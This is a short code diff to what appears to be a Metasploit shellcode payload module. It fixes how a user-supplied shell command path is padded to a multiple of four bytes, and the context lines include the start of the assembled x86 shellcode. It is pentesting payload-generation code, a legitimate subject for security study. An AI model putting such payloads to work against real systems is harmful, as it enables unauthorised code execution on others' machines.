@@ -37,6 +37,7 @@ module Metasploit3
     # pad the shell path to a multiple of 4 with slashes
     shell = datastore['CMD']
     remainder = shell.bytes.length % 4
+    if remainder == 0 then remainder = 4 end
     shell_padded = ("/" * (4-remainder)) + shell
 
     "\x31\xdb"             +#   xor ebx,ebx
